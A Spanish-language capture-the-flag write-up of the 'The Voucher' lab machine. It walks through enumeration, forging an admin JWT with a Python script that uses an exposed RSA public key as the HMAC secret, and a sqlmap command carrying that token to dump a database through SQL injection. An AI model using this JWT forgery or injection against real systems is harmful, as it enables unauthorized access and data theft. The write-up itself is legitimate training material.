# 🖥️ Write-Up: [THE VOUCHER](https://labs.thehackerslabs.com/machine/134)

## 📌 Información General
    - Nombre de la máquina: The Voucher
    - Plataforma: The Hacker Labs
    - Dificultad: Avanzado
    - Creador: K0B4KS
    - OS: Linux
    - Objetivos: Obtención de la Flag de usuario y de root

---

## 🔍 Enumeración

La máquina The Voucher posee la IP 10.0.5.17.

### Descubrimiento de Puertos

Realizamos un reconocimiento de todos los puertos de la máquina y nos quedamos únicamente con aquellos que están abiertos.

![allPorts](screenshots/allPorts.png)

La máquina tiene abiertos los `puertos 22, 80 y 8080`, así que vamos a proceder a realizar un escaneo de los servicios y las versiones de ellos que se encuentran en ejecución en esos puestos.

![target](screenshots/target.png)

Como no disponemos de credenciales y el puerto 22 no es vulnerable, vamos a proceder con el análisis de los puertos 80 y 8080.


#### Puerto 80

Nos encontramos con la página por defecto de Apache. Tras buscar subdirectorios y revisar el código fuente no encontramos nada.

Así que pasamos al siguiente puerto.

#### Puerto 8080

Aquí vemos la web de una academia de ciberseguridad. Tras revisarla, vemos que tenemos un index, un panel de login (login.php) y un panel de búsqueda de cursos (courses.php).

![home](screenshots/home.png)

Vamos a revisar el panel de búsqueda de cursos. Este nos exige un token para poder realizar la búsqueda, como no disponemos de uno, vamos a probar el panel de login.

![courses](screenshots/courses.png)

Tras intentar diferentes técnicas de bypass, sql injections, nosql injections,... en el panel de login, no hemos obtenido ningún resultado. Por lo tanto, vamos a utilizar la herramienta de wfuzz para enumerar subdirectorios de la web.

![subdirectorios](screenshots/directorio-keys.png)

Hemos encontrado un directorio `keys`, por su nombre, es posible que contenga algún tipo de llave, con esta idea en mente realizamos una enumeración de archivos en su interior con las extensiones de pem, pub, cert.

![files in keys](screenshots/public_keys.png)

Y como resultado de la búsqueda obtenemos un archivo `public.pem`, así que procedemos a ingresar en nuestro navegador la url `http://10.0.5.17:8080/keys/public.pem` para descargarlo, una vez hecho vemos que el archivo contiene una llave pública.


## 🔥Explotación

Con este llave vamos a intentar falsificar un Json Web Token esperando que el servidor esté mal configurado y únicamente firme el token con la llave pública que hemos encontrado. 

Para ello, usamos el siguiente script de python3: 

```python
import json, base64, hmac, hashlib

# Functions
def b64url_encode(data):
    s = base64.urlsafe_b64encode(data).rstrip(b"=")
    return s.decode("ascii")

def b64url_encode_json(obj):
    j = json.dumps(obj, separators=(',', ':'), sort_keys=True)
    return b64url_encode(j.encode('utf-8'))

def hmac_sha256(key, msg):
    return hmac.new(key, msg, hashlib.sha256).digest()

def build_token(header_obj, payload_obj, key_bytes):
    encoded_header = b64url_encode_json(header_obj)
    encoded_payload = b64url_encode_json(payload_obj)
    signing_input = (encoded_header + "." + encoded_payload).encode('ascii')
    sig = hmac_sha256(key_bytes, signing_input)
    encoded_sig = b64url_encode(sig)
    return f"{encoded_header}.{encoded_payload}.{encoded_sig}"


# Open public.pem
with open("public.pem", "rb") as file:
        key_bytes=file.read()

# Create JWT
header = {"alg": "HS256", "typ": "JWT"}

payload = {"username": "admin"},

token= build_token(header,payload, key_bytes)

print("Token--> " + token)
```

Este script nos devuelve este token --> `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY`

Ahora vamos a probar el token. Pero antes, revisamos el código fuente de courses.php para ver como y hacia donde se tramita la petición, ya que su función de búsqueda nos exigía un token.

![source](screenshots/api-courses.png)

Vemos que la petición se tramita mediante el método `GET` a `/api/courses.php` y le pasa el parámetro "`q`", así que vamos a usar curl para mandarle una petición a ese endpoint con el token generado y ver la respuesta.

![curl](screenshots/curl-courses.png)

El token funciona. Además, observamos un `sql_errors` en el json de la respuesta, así que podemos intentar poner una comilla al final del parámetro para ver su comportamiento y verificar si es vulnerable a una `SQL Injection`.

![slq_error](screenshots/curl-error_sql.png)

Y efectivamente, parece ser vulnerable. Por lo tanto, vamos a proceder a automatizar la inyección usando la herramienta de sqlmap sobre ese endpoint y pasándole el token generado.

```bash
sqlmap --url "http://10.0.5.17:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" --dump --batch 
```

Tras filtrarnos la base de datos, podemos ver que las `flags de usuario` y de `root` están en una tabla.

![flags](screenshots/flags.png)
